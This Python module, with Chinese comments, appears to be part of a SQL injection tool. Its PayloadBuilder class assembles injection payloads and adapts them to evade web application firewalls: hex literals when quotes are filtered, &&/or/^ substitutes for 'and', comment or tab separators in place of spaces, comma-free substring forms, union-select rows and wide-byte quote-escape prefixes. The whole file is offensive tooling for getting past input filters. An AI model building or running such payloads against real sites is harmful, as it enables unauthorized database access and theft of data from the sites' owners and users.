"""WAF 感知 Payload 构造器。

职责：把"核心 SQL 表达式"组装成完整可发 payload，并按 WAF 报告与实测形态自动变换：
- 形态（injection.form，实测命中）：classic / paren（括号法）/ inline（/**/）/ tab（%09）
- 引号被过滤  → 字符串走十六进制字面量
- 逗号被过滤  → substr from/for、limit offset
- and 被过滤  → 逻辑连接使用 && / or / ^
"""
from __future__ import annotations

from .models import InjectionPoint, WafReport
from ..tampers import (apply_form, comma_free, form_sep, or_inject,
                       to_hex_literal)


class PayloadBuilder:
    def __init__(self, injection: InjectionPoint, waf: WafReport):
        self.inj = injection
        self.waf = waf

    # ------------------------------------------------------------------ pieces
    def str_lit(self, s: str) -> str:
        """字符串字面量：引号被过滤时使用十六进制。"""
        if self.waf.is_filtered("'"):
            return to_hex_literal(s)
        return "'" + s.replace("'", "''") + "'"

    def logic_and(self, cond: str) -> str:
        """拼接布尔条件，and 被过滤时依次尝试 &&/or/^。"""
        cond = f"({cond})"
        if not self.waf.is_filtered("and"):
            return f" and {cond}"
        if not self.waf.is_filtered("&&"):
            return f"&&{cond}"
        if not self.waf.is_filtered("or"):
            return f" or {cond}"
        return self.logic_xor(cond)

    def logic_or(self, cond: str) -> str:
        """or 连接（登录框恒真语义）；or 被过滤时降级 || / and / ^。"""
        cond = f"({cond})"
        if not self.waf.is_filtered("or"):
            return f" or {cond}"
        if not self.waf.is_filtered("||"):
            return f"||{cond}"
        if not self.waf.is_filtered("and"):
            return f" and {cond}"
        return self.logic_xor(cond)

    def logic_xor(self, cond: str) -> str:
        """异或连接（FinalSQL 类：and/or/空格/注释全被滤）。
        数字型 1^(cond)：真→0（无行），假→保持基线值。^ 无需空格分隔。"""
        return f"^({cond})"

    # ------------------------------------------------------------------ transform
    def transform(self, sql: str) -> str:
        """按实测形态变换核心 SQL（空格被滤时切换括号/tab/内联）。"""
        form = getattr(self.inj, "form", "classic") or "classic"
        if form == "orinject":
            # 动态保护集取「证据含剥离」的全部字母关键字
            # （engine 在 orinject 形态下会把 filtered 翻转为可用，故不能按 filtered_list 取）
            extra = tuple(i.token for i in self.waf.items
                          if "剥离" in i.evidence
                          and i.token.replace("_", "").isalpha())
            sql = or_inject(sql, extra_kws=extra)
        else:
            sql = apply_form(sql, form)
        if self.waf.is_filtered(","):
            sql = comma_free(sql)
        return sql

    def wrap(self, core: str, base_value: str | None = None,
             neutralize: bool = True) -> str:
        """组装完整 payload：base + closure + core + comment。

        neutralize：仅对 union 前缀生效（置空原查询行，让 union 行占据回显位）。
        数字型（无闭合）时在关键字核心前插入形态分隔符，避免 0union 粘连。
        """
        b = base_value if base_value is not None else self.inj.base_value
        form = getattr(self.inj, "form", "classic") or "classic"
        if neutralize and core.lstrip().lower().startswith("union"):
            b = "0"
        pre = b if self.inj.numeric else b + self.inj.closure
        if pre and not pre.endswith(("'", '"', "`", ")")):
            core_t = self.transform(core)
            if core_t[:1].isalpha() or core_t[:1] == ";":
                pre += form_sep(form)
        tail = self.inj.comment if self.inj.comment not in ("quote-close", "none") else ""
        return pre + self.transform(core) + tail

    def union_row(self, exprs: list) -> str:
        """构造 union select 一行（exprs 为各列表达式，null 占位）。"""
        select_kw = "union/**/select/**/" if self.waf.is_filtered("space") else "union select "
        return self.wrap(select_kw + ",".join(exprs), base_value="0")

    def widebyte_prefix(self) -> str:
        """宽字节 payload 的前缀（\xdf + 闭合）。"""
        if self.inj.numeric:
            return self.inj.base_value
        return self.inj.base_value + "\xdf" + self.inj.closure
